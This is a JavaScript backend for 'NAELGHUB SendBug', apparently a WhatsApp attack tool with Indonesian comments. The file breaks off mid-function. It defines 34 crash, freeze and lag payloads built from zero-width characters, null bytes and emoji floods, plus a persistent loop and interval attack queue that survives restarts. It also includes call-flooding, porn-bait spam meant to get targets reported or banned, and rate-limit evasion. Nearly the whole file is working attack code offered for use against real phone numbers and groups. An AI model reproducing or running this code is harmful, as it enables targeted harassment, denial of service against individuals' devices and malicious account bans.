/**
 * NAELGHUB SendBug Backend v12.0
 * Persistent Attack Engine
 * Features:
 *   - Loop mode (continuous attack)
 *   - Interval mode (scheduled attack)
 *   - Multi-target queue
 *   - Auto-retry failed messages
 *   - Persistent queue (survives restart)
 *   - Smart rate-limit
 *   - Multi-bug rotation
 *
 * Endpoints:
 *   GET  /api/health
 *   GET  /api/status          → cek koneksi WA
 *   GET  /api/qr              → QR pairing
 *   GET  /api/bugs            → list bug
 *   GET  /api/queue           → status queue
 *   GET  /api/history/:phone  → history attack target
 *   POST /api/pair            → pairing code
 *   POST /api/sendbug         → kirim bug (single/loop/interval)
 *   POST /api/queue/add       → tambah target ke queue
 *   POST /api/queue/remove    → hapus target dari queue
 *   POST /api/queue/clear     → bersihkan queue
 *   POST /api/spamcall        → spam panggilan
 *   POST /api/sendotp         → kirim OTP
 *   POST /api/logout          → unpair
 */

const express = require('express');
const cors = require('cors');
const qrcode = require('qrcode');
const qrcodeTerminal = require('qrcode-terminal');
const pino = require('pino');
const fs = require('fs');
const path = require('path');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    Browsers,
    delay
} = require('@whiskeysockets/baileys');

const app = express();
app.use(cors({ origin: '*' }));
app.use(express.json({ limit: '20mb' }));

/* NAELGHUB_SPOTIFY_API_V1 */
// Spotify catalog search. Set SPOTIFY_CLIENT_ID and SPOTIFY_CLIENT_SECRET
// in server environment variables; never expose the secret to the browser.
app.get('/api/spotify/search', async (req, res) => {
  try {
    const q = String(req.query.q || '').trim();
    if (!q) return res.status(400).json({ error: 'Query kosong' });
    const id = process.env.SPOTIFY_CLIENT_ID;
    const secret = process.env.SPOTIFY_CLIENT_SECRET;
    if (!id || !secret) return res.status(503).json({ error: 'Spotify belum dikonfigurasi' });

    const basic = Buffer.from(`${id}:${secret}`).toString('base64');
    const tokenResp = await fetch('https://accounts.spotify.com/api/token', {
      method:'POST',
      headers:{'Authorization':`Basic ${basic}`,'Content-Type':'application/x-www-form-urlencoded'},
      body:'grant_type=client_credentials'
    });
    const token = await tokenResp.json();
    if (!tokenResp.ok) return res.status(502).json({ error:'Gagal mendapatkan token Spotify' });

    const url = 'https://api.spotify.com/v1/search?type=track&limit=20&q=' + encodeURIComponent(q);
    const r = await fetch(url,{headers:{Authorization:`Bearer ${token.access_token}`}});
    const data = await r.json();
    res.status(r.status).json(data);
  } catch (e) {
    res.status(500).json({ error:'Spotify request gagal' });
  }
});

/* NAELGHUB_GLOBAL_CHAT_API */

/* NAELGHUB_GLOBAL_CHAT_API */
// Separate, benign global-chat status endpoint. It is NOT sendBug().
app.get('/api/global-chat/status', (req, res) => {
  res.json({ ok: true, service: 'global-chat', separateFrom: 'sendBug' });
});


const PORT = process.env.PORT || 3000;
const QUEUE_FILE = path.join(__dirname, 'queue.json');
const HISTORY_FILE = path.join(__dirname, 'history.json');

/* ============================================================
   STATE
   ============================================================ */
let sock = null;
let isConnected = false;
let currentQR = null;
let currentQRDataUrl = null;
let connectedNumber = null;
let isStarting = false;
let reconnectAttempts = 0;

let attackQueue = [];        // daftar target aktif
let attackHistory = [];      // history
let activeWorkers = new Map();  // key: target -> { status, sent, failed, startedAt }
let senderBlockedUntil = 0;  // rate-limit smart

const logger = pino({ level: 'silent' });

/* ============================================================
   SPECIAL CHARS
   ============================================================ */
const ZWSP = '\u200B';
const ZWNJ = '\u200C';
const ZWJ  = '\u200D';
const HF   = '\u3164';
const NULL = '\u0000';
const RFFD = '\uFFFD';
const BOM  = '\uFEFF';
const LRO  = '\u202E';
const RLO  = '\u202D';

/* ============================================================
   BUG LIBRARY v12.0 (34 bugs)
   ============================================================ */
const BUG_LIBRARY = {

    /* ========== PERSONAL (8) ========== */
    'CSPAM': {
        category: 'personal', name: 'CSPAM (Delay Spam)',
        desc: 'Pesan berjeda → antrean lag di HP target',
        vipOnly: false,
        generate: (i) => `${ZWSP.repeat(200)}CSPAM-${String(i).padStart(3,'0')}${ZWSP.repeat(200)}`,
        perMessageDelay: 800, count: 20
    },
    'CSPAMXX': {
        category: 'personal', name: 'CSPAMXX (Force Close)',
        desc: 'Format rusak → parser WA FC',
        vipOnly: false,
        generate: (i) => NULL.repeat(50) + BOM.repeat(10) + RFFD.repeat(100) + ZWJ.repeat(500) + LRO + 'CSPAMXX-' + i + RLO,
        perMessageDelay: 300, count: 10
    },
    'CLICK': {
        category: 'personal', name: 'CLICK',
        desc: 'Eksploitasi fitur klik/link target',
        vipOnly: false,
        generate: (i) => `https://${'a'.repeat(200)}.wa.me/${'9'.repeat(40 + i)}\n${ZWSP.repeat(1000)}`,
        perMessageDelay: 500, count: 5
    },
    'SPAM_CALL': {
        category: 'personal', name: 'SPAM CALL',
        desc: 'Flood notifikasi panggilan masuk',
        vipOnly: true, generate: () => null, useCall: true,
        perMessageDelay: 600, count: 15
    },
    'ANDROID': {
        category: 'personal', name: 'ANDROID',
        desc: 'System UI Android crash',
        vipOnly: true,
        generate: (i) => ZWNJ.repeat(2000) + '😀'.repeat(200) + NULL.repeat(20) + ZWJ.repeat(300) + '🅰️-' + i,
        perMessageDelay: 400, count: 8
    },
    'SPAM_MBOKEP': {
        category: 'personal', name: 'SPAM MBOKEP',
        desc: 'Konten trigger report',
        vipOnly: false,
        generate: (i) => {
            const w = ['VIDEO', 'BOKEP', 'XXX', 'LINK', 'FREE'][i % 5];
            return `⚠️ ${w}_${i} ⚠️\n${ZWSP.repeat(300)}Kirim ke 10 orang untuk buka link`;
        },
        perMessageDelay: 700, count: 15
    },
    'CXINV': {
        category: 'personal', name: 'CXINV',
        desc: 'Invite grup metadata rusak',
        vipOnly: true,
        generate: (i) => `https://chat.whatsapp.com/${'A'.repeat(20 + (i % 5))}`,
        perMessageDelay: 1000, count: 5
    },
    'FC_ANDROID_V2': {
        category: 'personal', name: 'FC ANDROID V2',
        desc: 'Background service restart cycle',
        vipOnly: true,
        generate: (i) => (ZWJ + ZWNJ + ZWSP + BOM).repeat(200) + '\n🔄 FC-V2-' + i + ' 🔄',
        perMessageDelay: 350, count: 10
    },

    /* ========== GROUP (6) ========== */
    'BLANK_GROUP': {
        category: 'group', name: 'BLANK GROUP',
        desc: 'Pesan kosong + hidden script',
        vipOnly: false,
        generate: () => HF.repeat(5000) + ZWSP.repeat(2000) + NULL.repeat(100),
        perMessageDelay: 500, count: 10
    },
    'DELAY_MEMB': {
        category: 'group', name: 'Delay Memb Group',
        desc: 'Manipulasi member list',
        vipOnly: true,
        generate: (i) => `[MEMBER-SYNC-${i}]${ZWSP.repeat(5000)}`,
        perMessageDelay: 400, count: 20
    },
    'MIX_COMBO': {
        category: 'group', name: 'MIX COMBO',
        desc: 'Blank + Delay intensitas tinggi',
        vipOnly: true,
        generate: (i) => HF.repeat(3000) + ZWSP.repeat(3000) + ZWJ.repeat(1000) + 'COMBO-' + i,
        perMessageDelay: 300, count: 15
    },
    'SPAM_BOKEP': {
        category: 'group', name: 'SPAM BOKEP',
        desc: 'Flood grup → auto-ban',
        vipOnly: true,
        generate: (i) => `${['[18+]', '[XXX]', '[BOKEP]', '[VIDEO]'][i % 4]} ${i}\n${ZWSP.repeat(200)}`,
        perMessageDelay: 600, count: 20
    },
    'BANZ_GB_V1': {
        category: 'group', name: 'BANZ GB V1',
        desc: 'Add invalid member → ban',
        vipOnly: true, generate: () => null, useGroupAdd: true,
        perMessageDelay: 800, count: 10
    },
    'BANZ_GB_V2': {
        category: 'group', name: 'BANZ GB V2',
        desc: 'Invite/remove cycle agresif',
        vipOnly: true, generate: () => null, useGroupAdd: true,
        perMessageDelay: 500, count: 15
    },

    /* ========== V2 (20) ========== */
    'DELAYHARD': { category:'v2', name:'DELAYHARD', desc:'ZW heavy → lag', vipOnly:false,
        generate:() => ZWSP.repeat(8000) + '\n🔥 DELAYHARD 🔥', perMessageDelay:250, count:5 },
    'DELAYMS':   { category:'v2', name:'DELAYMS',   desc:'Delay medium', vipOnly:false,
        generate:() => ZWSP.repeat(4000) + '\n⚡ DELAYMS ⚡', perMessageDelay:250, count:5 },
    'DELAYMAX':  { category:'v2', name:'DELAYMAX',  desc:'Delay max', vipOnly:true,
        generate:() => ZWSP.repeat(15000) + '\n💥 DELAYMAX 💥', perMessageDelay:200, count:5 },
    'DELAYPRO':  { category:'v2', name:'DELAYPRO',  desc:'Delay 25k chars', vipOnly:true,
        generate:() => ZWSP.repeat(25000) + '\n☠️ DELAYPRO ☠️', perMessageDelay:180, count:5 },
    'CRASHHARD': { category:'v2', name:'CRASHHARD', desc:'Null byte → parser exception', vipOnly:true,
        generate:() => NULL.repeat(800) + ZWSP.repeat(2000) + '\n💀 CRASHHARD 💀', perMessageDelay:300, count:5 },
    'CRASHMS':   { category:'v2', name:'CRASHMS',   desc:'Crash medium', vipOnly:true,
        generate:() => NULL.repeat(400) + ZWSP.repeat(1000) + '\n💀 CRASHMS 💀', perMessageDelay:300, count:5 },
    'CRASHMAX':  { category:'v2', name:'CRASHMAX',  desc:'Crash max', vipOnly:true,
        generate:() => NULL.repeat(1500) + ZWSP.repeat(3000) + '\n💀 CRASHMAX 💀', perMessageDelay:250, count:5 },
    'CRASHPRO':  { category:'v2', name:'CRASHPRO',  desc:'Crash pro', vipOnly:true,
        generate:() => NULL.repeat(2000) + ZWSP.repeat(5000) + '\n💀 CRASHPRO 💀', perMessageDelay:200, count:5 },
    'FREEZEHARD':{ category:'v2', name:'FREEZEHARD',desc:'ZWJ sequence', vipOnly:true,
        generate:() => (ZWSP + ZWNJ + ZWJ).repeat(5000) + '\n❄️ FREEZEHARD ❄️', perMessageDelay:250, count:5 },
    'FREEZEMS':  { category:'v2', name:'FREEZEMS',  desc:'Freeze medium', vipOnly:true,
        generate:() => (ZWSP + ZWNJ + ZWJ).repeat(2500) + '\n❄️ FREEZEMS ❄️', perMessageDelay:250, count:5 },
    'FREEZEMAX': { category:'v2', name:'FREEZEMAX', desc:'Freeze max', vipOnly:true,
        generate:() => (ZWSP + ZWNJ + ZWJ).repeat(8000) + '\n❄️ FREEZEMAX ❄️', perMessageDelay:200, count:5 },
    'FREEZEPRO': { category:'v2', name:'FREEZEPRO', desc:'Freeze pro', vipOnly:true,
        generate:() => (ZWSP + ZWNJ + ZWJ).repeat(12000) + '\n❄️ FREEZEPRO ❄️', perMessageDelay:180, count:5 },
    'BLANKHARD': { category:'v2', name:'BLANKHARD', desc:'Hangul filler', vipOnly:false,
        generate:() => HF.repeat(2000), perMessageDelay:250, count:5 },
    'BLANKMS':   { category:'v2', name:'BLANKMS',   desc:'Blank medium', vipOnly:false,
        generate:() => HF.repeat(1000), perMessageDelay:250, count:5 },
    'BLANKMAX':  { category:'v2', name:'BLANKMAX',  desc:'Blank max', vipOnly:false,
        generate:() => HF.repeat(4000), perMessageDelay:200, count:5 },
    'BLANKPRO':  { category:'v2', name:'BLANKPRO',  desc:'Blank pro', vipOnly:true,
        generate:() => HF.repeat(6000), perMessageDelay:180, count:5 },
    'LOCKiOS':   { category:'v2', name:'LOCK iOS',  desc:'Emoji buffer overflow', vipOnly:true,
        generate:() => '🔥'.repeat(1000) + ZWSP.repeat(2000) + '\n⚠️ LOCK iOS ⚠️', perMessageDelay:300, count:5 },
    'LOCKMAX':   { category:'v2', name:'LOCKMAX',   desc:'Lock max', vipOnly:true,
        generate:() => '💀'.repeat(2000) + ZWSP.repeat(3000) + '\n⚠️ LOCKMAX ⚠️', perMessageDelay:250, count:5 },
    'LOCKPRO':   { category:'v2', name:'LOCKPRO',   desc:'Lock pro', vipOnly:true,
        generate:() => '⚠️'.repeat(3000) + ZWSP.repeat(4000) + '\n⚠️ LOCKPRO ⚠️', perMessageDelay:200, count:5 },
    'LOCKHARD':  { category:'v2', name:'LOCKHARD',  desc:'5000 emoji spam', vipOnly:true,
        generate:() => '💥'.repeat(5000) + NULL.repeat(500) + '\n⚠️ LOCKHARD ⚠️', perMessageDelay:200, count:5 }
};

/* ============================================================
   PERSISTENCE
   ============================================================ */
function saveQueue(){
    try { fs.writeFileSync(QUEUE_FILE, JSON.stringify(attackQueue, null, 2)); } catch(e){}
}
function loadQueue(){
    try {
        if (fs.existsSync(QUEUE_FILE)) {
            attackQueue = JSON.parse(fs.readFileSync(QUEUE_FILE, 'utf8')) || [];
            console.log(`[QUEUE] Loaded ${attackQueue.length} target(s) from disk`);
        }
    } catch(e){ attackQueue = []; }
}
function saveHistory(){
    try { fs.writeFileSync(HISTORY_FILE, JSON.stringify(attackHistory.slice(-1000), null, 2)); } catch(e){}
}
function loadHistory(){
    try {
        if (fs.existsSync(HISTORY_FILE)) {
            attackHistory = JSON.parse(fs.readFileSync(HISTORY_FILE, 'utf8')) || [];
        }
    } catch(e){ attackHistory = []; }
}
function addHistoryEntry(entry){
    attackHistory.push({ ...entry, ts: Date.now() });
    if (attackHistory.length > 1000) attackHistory = attackHistory.slice(-1000);
    saveHistory();
}

/* ============================================================
   START WHATSAPP
   ============================================================ */
async function startWhatsApp() {
    if (isStarting) return;
    isStarting = true;

    try {
        const { state, saveCreds } = await useMultiFileAuthState('./sessions');
        const { version, isLatest } = await fetchLatestBaileysVersion();
        console.log(`[WA] Baileys v${version.join('.')} (latest: ${isLatest})`);

        sock = makeWASocket({
            version, logger, printQRInTerminal: false,
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, logger)
            },
            browser: Browsers.macOS('Desktop'),
            generateHighQualityLinkPreview: false,
            syncFullHistory: false,
            markOnlineOnConnect: false,
            defaultQueryTimeoutMs: 60000,
            connectTimeoutMs: 60000,
            keepAliveIntervalMs: 30000,
            retryRequestDelayMs: 500,
            maxMsgRetryCount: 3,
            getMessage: async () => undefined
        });

        sock.ev.on('creds.update', saveCreds);

        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect, qr } = update;
            if (qr) {
                currentQR = qr;
                try {
                    currentQRDataUrl = await qrcode.toDataURL(qr, {
                        width: 300, margin: 1,
                        color: { dark: '#000000', light: '#FFFFFF' }
                    });
                } catch (e) { currentQRDataUrl = null; }
                console.log('\n=================================');
                console.log('[QR] Scan QR ini dengan WhatsApp Anda');
                console.log('=================================\n');
                qrcodeTerminal.generate(qr, { small: true });
                console.log('\n[INFO] QR juga tersedia di /api/qr\n');
            }
            if (connection === 'close') {
                isConnected = false;
                connectedNumber = null;
                currentQR = null;
                currentQRDataUrl = null;
                const statusCode = lastDisconnect?.error?.output?.statusCode;
                const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
                console.log(`[WA] Closed. Status: ${statusCode}. Reconnect: ${shouldReconnect}`);
                if (shouldReconnect) {
                    reconnectAttempts++;
                    const waitMs = Math.min(5000 * reconnectAttempts, 30000);
                    setTimeout(() => { isStarting = false; startWhatsApp(); }, waitMs);
                } else { isStarting = false; }
            } else if (connection === 'open') {
                isConnected = true;
                currentQR = null;
                currentQRDataUrl = null;
                reconnectAttempts = 0;
                isStarting = false;
                connectedNumber = sock.user?.id?.split(':')[0] || 'unknown';
                console.log(`\n✅ [WA] Terhubung sebagai ${connectedNumber}\n`);
                // Restart queue worker setelah reconnect
                resumeActiveQueue();
            }
        });

        sock.ev.on('messages.upsert', (m) => {
            const msg = m.messages[0];
            if (!msg?.message || msg.key.fromMe) return;
            const from = msg.key.remoteJid;
            const text = msg.message.conversation || msg.message.extendedTextMessage?.text || '[media]';
            console.log(`[MSG] ${from}: ${text.substring(0, 50)}`);
        });

    } catch (err) {
        console.error('[WA] Error start:', err.message);
        isStarting = false;
        setTimeout(() => startWhatsApp(), 5000);
    }
}

/* ============================================================
   HELPERS
   ============================================================ */
function cleanPhone(input) {
    let s = String(input).replace(/[^0-9]/g, '');
    if (s.startsWith('0')) s = '62' + s.substring(1);
    return s;
}

function sleep(ms){ return new Promise(r => setTimeout(r, ms)); }

/* ============================================================
   PERSISTENT ATTACK WORKER
   ============================================================ */
async function runAttackWorker(queueItem) {
    const {
        id, target, bugType, mode = 'stealth',
        attackMode = 'loop',        // 'once' | 'loop' | 'interval'
        intervalSec = 60,           // untuk mode interval
        maxDurationMin = 60,        // max durasi attack (menit)
        roundRepeat = 5,            // jumlah pesan per round
        createdBy = 'unknown'
    } = queueItem;

    const bug = BUG_LIBRARY[bugType];
    if (!bug) {
        console.log(`[WORKER] Bug ${bugType} tidak ditemukan`);
        return;
    }

    const jid = target.includes('@') ? target : `${cleanPhone(target)}@s.whatsapp.net`;

    // Validate target exists (sekali saja)
    if (jid.endsWith('@s.whatsapp.net')) {
        try {
            const clean = jid.split('@')[0];
            const check = await sock.onWhatsApp(clean);
            if (!Array.isArray(check) || check.length === 0 || !check[0].exists) {
                console.log(`[WORKER] Target ${target} tidak terdaftar di WA`);
                activeWorkers.set(id, { status: 'error', error: 'Target tidak terdaftar di WhatsApp' });
                addHistoryEntry({ target: jid, bugType, status: 'failed', reason: 'not on WA' });
                return;
            }
        } catch(e){}
    }

    const startTime = Date.now();
    const maxDurationMs = maxDurationMin * 60 * 1000;

    let totalSent = 0;
    let totalFailed = 0;
    let round = 0;
    let running = true;

    activeWorkers.set(id, {
        status: 'running',
        target: jid,
        bugType,
        attackMode,
        sent: 0,
        failed: 0,
        round: 0,
        startedAt: startTime
    });

    console.log(`[WORKER] Start attack ${bugType} → ${jid} mode=${attackMode}`);

    // Mode config
    const modeConfig = {
        burst:   { multiplier: 0.5, concurrency: 8 },
        stealth: { multiplier: 3,   concurrency: 1 },
        flood:   { multiplier: 0.3, concurrency: 10 }
    };
    const cfg = modeConfig[mode] || modeConfig.stealth;
    const perMsgDelay = Math.max(300, (bug.perMessageDelay || 400) * cfg.multiplier);

    // Main loop
    while (running && Date.now() - startTime < maxDurationMs) {
        // Kalau sender kena rate-limit, tunggu
        if (Date.now() < senderBlockedUntil) {
            const waitSec = Math.ceil((senderBlockedUntil - Date.now()) / 1000);
            console.log(`[WORKER] Rate-limit cooldown ${waitSec}s`);
            await sleep(2000);
            continue;
        }

        round++;
        const thisRoundRepeat = Math.max(1, parseInt(roundRepeat));

        // Kirim beberapa pesan per round (sequential, biar aman)
        for (let i = 0; i < thisRoundRepeat && running; i++) {
            if (Date.now() - startTime >= maxDurationMs) { running = false; break; }
            if (Date.now() < senderBlockedUntil) break;

            const t0 = Date.now();
            try {
                if (bug.useCall) {
                    if (typeof sock.offerCall === 'function') {
                        await sock.offerCall(jid);
                    } else {
                        await sock.sendMessage(jid, { text: `📞 NAELGHUB-${Date.now()}` });
                    }
                } else if (bug.useGroupAdd) {
                    await sock.sendMessage(jid, { text: HF.repeat(3000) + ZWSP.repeat(2000) });
                } else {
                    const text = bug.generate(i);
                    await sock.sendMessage(jid, { text });
                }

                totalSent++;
                const elapsed = Date.now() - t0;

                // Deteksi kalau WA kasih error spesifik (rate-limit)
                console.log(`[R${round}] ✅ ${bugType} → ${jid} (${elapsed}ms)`);

                activeWorkers.set(id, {
                    status: 'running',
                    target: jid, bugType, attackMode,
                    sent: totalSent, failed: totalFailed, round,
                    startedAt: startTime
                });
            } catch (e) {
                totalFailed++;
                console.log(`[R${round}] ❌ ${e.message}`);

                // Kalau error mengandung "rate" atau "spam" → cooldown
                const msg = (e.message || '').toLowerCase();
                if (msg.includes('rate') || msg.includes('spam') || msg.includes('limit')) {
                    senderBlockedUntil = Date.now() + 60000;
                    console.log(`[WORKER] Detected rate-limit, cooldown 60s`);
                    break;
                }
            }

            await sleep(perMsgDelay + Math.floor(Math.random() * 200));
        }

        // Update history setiap round
        addHistoryEntry({
            target: jid, bugType, attackMode, round,
            sent: totalSent, failed: totalFailed,
            createdBy
        });

        if (attackMode === 'once') { running = false; break; }
        if (attackMode === 'interval') {
            console.log(`[WORKER] Round ${round} selesai, tunggu ${intervalSec}s`);
            await sleep(intervalSec * 1000);
        }
        // loop mode → langsung lanjut round berikutnya
    }

    const totalMs = Date.now() - startTime;
    const finalStatus = running ? 'stopped_by_timeout' : 'stopped';
    activeWorkers.set(id, {
        status: 'stopped',
        target: jid, bugType, attackMode,
        sent: totalSent, failed: totalFailed, round,
        totalMs,
        startedAt: startTime, stoppedAt: Date.now()
    });

    console.log(`[WORKER] ✅ Finish ${jid} | Sent: ${totalSent} | Failed: ${totalFailed} | Rounds: ${round}`);
}

function startQueueItem(item){
    if (activeWorkers.has(item.id) && activeWorkers.get(item.id).status === 'running') {
        return false;
    }
    runAttackWorker(item).catch(e => {
        console.error('[WORKER] Fatal:', e.message);
        activeWorkers.set(item.id, { status: 'error', error: e.message });
    });
    return true;
}

function resumeActiveQueue(){
    const pending = attackQueue.filter(q => q.active);
    if (pending.length === 0) return;
    console.log(`[QUEUE] Resume ${pending.length} target...`);
    pending.forEach(item => {
        if (!activeWorkers.has(item.id)) startQueueItem(item);
    });
}

/* ============================================================
   ENDPOINTS
   ============================================================ */
app.get('/api/health', (req, res) => {
    res.json({
        ok: true,
        uptime: process.uptime(),
        timestamp: Date.now(),
        version: 'v12.0'
    });
});

app.get('/api/status', (req, res) => {
    res.json({
        connected: isConnected,
        number: connectedNumber,
        qr: currentQR ? 'available' : null,
        hasQRDataUrl: !!currentQRDataUrl,
        uptime: process.uptime(),
        reconnectAttempts,
        queueSize: attackQueue.length,
        activeWorkers: Array.from(activeWorkers.entries())
            .filter(([_, w]) => w.status === 'running')
            .length,
        senderBlockedUntil,
        version: 'v12.0'
    });
});

app.get('/api/qr', (req, res) => {
    if (!currentQR) {
        return res.json({
            qr: null,
            message: isConnected ? `Connected as ${connectedNumber}` : 'QR belum tersedia. Tunggu 5-10 detik.'
        });
    }
    res.json({ qr: currentQR, qrDataUrl: currentQRDataUrl });
});

app.get('/api/bugs', (req, res) => {
    const list = {};
    for (const [key, bug] of Object.entries(BUG_LIBRARY)) {
        if (!list[bug.category]) list[bug.category] = [];
        list[bug.category].push({
            id: key, name: bug.name, desc: bug.desc, vipOnly: bug.vipOnly
        });
    }
    res.json({
        categories: Object.keys(list),
        bugs: list,
        total: Object.keys(BUG_LIBRARY).length,
        version: 'v12.0'
    });
});

app.get('/api/queue', (req, res) => {
    const workers = {};
    activeWorkers.forEach((v, k) => { workers[k] = v; });
    res.json({
        queue: attackQueue,
        workers,
        total: attackQueue.length,
        active: Array.from(activeWorkers.values()).filter(w => w.status === 'running').length
    });
});

app.get('/api/history/:phone', (req, res) => {
    const phone = String(req.params.phone).replace(/[^0-9]/g, '');
    const filtered = attackHistory.filter(h => h.target && h.target.includes(phone));
    res.json({ target: phone, entries: filtered.slice(-100), total: filtered.length });
});

app.post('/api/pair', async (req, res) => {
    const { phone } = req.body || {};
    if (!phone) return res.status(400).json({ error: 'phone wajib' });
    if (!sock) return res.status(503).json({ error: 'Socket belum siap' });
    if (isConnected) return res.status(400).json({ error: `Sudah terhubung sebagai ${connectedNumber}` });
    try {
        const clean = cleanPhone(phone);
        if (clean.length < 10) return res.status(400).json({ error: 'Nomor invalid' });
        const code = await sock.requestPairingCode(clean);
        res.json({ code, phone: clean });
    } catch (e) { res.status(500).json({ error: e.message }); }
});

/* ============================================================
   SENDBUG — SINGLE ATTACK (langsung kirim)
   ============================================================ */
app.post('/api/sendbug', async (req, res) => {
    const {
        target, bugType = 'DELAYHARD', repeat, mode = 'burst'
    } = req.body || {};

    if (!isConnected || !sock) {
        return res.status(503).json({ error: 'WA belum terhubung. Scan QR dulu.' });
    }
    if (!target) return res.status(400).json({ error: 'Target wajib' });

    const bug = BUG_LIBRARY[bugType];
    if (!bug) {
        return res.status(404).json({ error: `Bug "${bugType}" tidak ada`, available: Object.keys(BUG_LIBRARY) });
    }

    // JID
    let jid;
    const rawTarget = String(target).trim();
    if (rawTarget.endsWith('@g.us') || rawTarget.endsWith('@s.whatsapp.net')) {
        jid = rawTarget;
    } else {
        const clean = cleanPhone(rawTarget);
        if (clean.length < 8 || clean.length > 15) {
            return res.status(400).json({ error: 'Format target invalid' });
        }
        jid = `${clean}@s.whatsapp.net`;
    }

    // Validate
    let targetExists = true;
    if (jid.endsWith('@s.whatsapp.net')) {
        try {
            const clean = jid.split('@')[0];
            const check = await sock.onWhatsApp(clean);
            targetExists = Array.isArray(check) && check.length > 0 && check[0].exists;
        } catch (e) { targetExists = false; }
    }
    if (!targetExists) {
        return res.status(404).json({ error: `Nomor ${jid} tidak terdaftar di WhatsApp`, target: jid });
    }

    const total = Math.min(Math.max(parseInt(repeat) || bug.count || 1, 1), 100);
    const modeConfig = {
        burst:   { multiplier: 1,   concurrency: 5 },
        stealth: { multiplier: 3,   concurrency: 2 },
        flood:   { multiplier: 0.5, concurrency: 10 }
    };
    const cfg = modeConfig[mode] || modeConfig.burst;
    const perMsgDelay = Math.max(50, (bug.perMessageDelay || 300) * cfg.multiplier);

    console.log(`[SENDBUG] → ${jid} | ${bugType} | ×${total} | ${mode}`);

    const results = [];
    let index = 0;
    const startTime = Date.now();

    const worker = async (workerId) => {
        while (index < total) {
            const myIdx = index++;
            if (myIdx >= total) break;
            const t0 = Date.now();
            try {
                if (bug.useCall) {
                    if (typeof sock.offerCall === 'function') await sock.offerCall(jid);
                    else await sock.sendMessage(jid, { text: `📞 Missed #${myIdx}` });
                } else if (bug.useGroupAdd) {
                    await sock.sendMessage(jid, { text: HF.repeat(3000) + ZWSP.repeat(2000) });
                } else {
                    await sock.sendMessage(jid, { text: bug.generate(myIdx) });
                }
                results.push({ index: myIdx, ok: true, ms: Date.now() - t0 });
                console.log(`[${myIdx+1}/${total}] ✅ (${Date.now()-t0}ms)`);
            } catch (e) {
                results.push({ index: myIdx, ok: false, error: e.message, ms: Date.now() - t0 });
                console.log(`[${myIdx+1}/${total}] ❌ ${e.message}`);
            }
            if (perMsgDelay > 0) await sleep(perMsgDelay + Math.floor(Math.random() * 150));
        }
    };

    const workers = [];
    for (let i = 0; i < cfg.concurrency; i++) workers.push(worker(i));
    await Promise.allSettled(workers);

    const sent = results.filter(r => r.ok).length;
    const failed = results.filter(r => !r.ok).length;
    const totalMs = Date.now() - startTime;

    addHistoryEntry({ target: jid, bugType, mode, sent, failed, totalMs, createdBy: 'single' });

    res.json({
        success: true, target: jid, bugType, bugName: bug.name, category: bug.category,
        mode, total, sent, failed, totalMs,
        avgMs: Math.round(totalMs / total),
        from: connectedNumber, results
    });
});

/* ============================================================
   QUEUE — PERSISTENT ATTACK
   ============================================================ */
app.post('/api/queue/add', async (req, res) => {
    if (!isConnected || !sock) {
        return res.status(503).json({ error: 'WA belum terhubung' });
    }
    const {
        target, bugType = 'DELAYHARD',
        attackMode = 'loop',         // 'once' | 'loop' | 'interval'
        intervalSec = 60,
        maxDurationMin = 60,         // max 60 menit default, max 1440 (24 jam)
        roundRepeat = 5,
        mode = 'stealth',
        createdBy = 'unknown'
    } = req.body || {};

    if (!target) return res.status(400).json({ error: 'target wajib' });
    if (!BUG_LIBRARY[bugType]) return res.status(404).json({ error: 'bugType invalid' });

    const cleanDuration = Math.min(Math.max(parseInt(maxDurationMin) || 60, 1), 1440);
    const cleanRepeat = Math.min(Math.max(parseInt(roundRepeat) || 5, 1), 50);

    let jid;
    const raw = String(target).trim();
    if (raw.endsWith('@g.us') || raw.endsWith('@s.whatsapp.net')) jid = raw;
    else {
        const clean = cleanPhone(raw);
        if (clean.length < 8 || clean.length > 15) {
            return res.status(400).json({ error: 'Format target invalid' });
        }
        jid = `${clean}@s.whatsapp.net`;
    }

    const id = `atk_${Date.now()}_${Math.random().toString(36).substring(2,8)}`;
    const item = {
        id, target: jid, bugType, attackMode,
        intervalSec: Math.max(10, parseInt(intervalSec) || 60),
        maxDurationMin: cleanDuration,
        roundRepeat: cleanRepeat,
        mode, createdBy,
        active: true,
        createdAt: Date.now()
    };

    attackQueue.push(item);
    saveQueue();
    startQueueItem(item);

    res.json({
        success: true,
        message: `Target ${jid} masuk queue`,
        item,
        queueSize: attackQueue.length
    });
});

app.post('/api/queue/remove', (req, res) => {
    const { id } = req.body || {};
    if (!id) return res.status(400).json({ error: 'id wajib' });
    const idx = attackQueue.findIndex(q => q.id === id);
    if (idx === -1) return res.status(404).json({ error: 'item tidak ada' });
    const removed = attackQueue.splice(idx, 1)[0];
    removed.active = false;
    saveQueue();
    // Mark worker to stop
    const w = activeWorkers.get(id);
    if (w) w.status = 'stop_requested';
    res.json({ success: true, removed });
});

app.post('/api/queue/clear', (req, res) => {
    const count = attackQueue.length;
    attackQueue = [];
    saveQueue();
    activeWorkers.forEach((v,k) => {
        if (v.status === 'running') v.status = 'stop_requested';
    });
    res.json({ success: true, cleared: count });
});

/* ============================================================
   SPAM CALL
   ============================================================ */
app.post('/api/spamcall', async (req, res) => {
    const { target, count = 5, delayMs = 800 } = req.body || {};
    if (!isConnected || !sock) return res.status(503).json({ error: 'WA belum terhubung' });
    if (!target) return res.status(400).json({ error: 'target wajib' });

    const clean = cleanPhone(target);
    const jid = `${clean}@s.whatsapp.net`;
    const total = Math.min(Math.max(parseInt(count) || 5, 1), 50);

    const results = [];
    for (let i = 0; i < total; i++) {
        const t0 = Date.now();
        try {
            if (typeof sock.offerCall === 'function') await sock.offerCall(jid);
            else await sock.sendMessage(jid, { text: `📞 Missed #${i}` });
            results.push({ index: i, ok: true, ms: Date.now() - t0 });
        } catch (e) {
            results.push({ index: i, ok: false, error: e.message });
        }
        await sleep(delayMs);
    }
    const sent = results.filter(r => r.ok).length;
    res.json({ success: true, target: jid, total, sent, failed: total - sent, results });
});

/* ============================================================
   SEND OTP
   ============================================================ */
app.post('/api/sendotp', async (req, res) => {
    const { target, message, otp } = req.body || {};
    if (!isConnected || !sock) return res.status(503).json({ error: 'WA belum terhubung' });
    if (!target) return res.status(400).json({ error: 'target wajib' });

    const clean = cleanPhone(target);
    const jid = `${clean}@s.whatsapp.net`;
    let text = message;
    if (!text) {
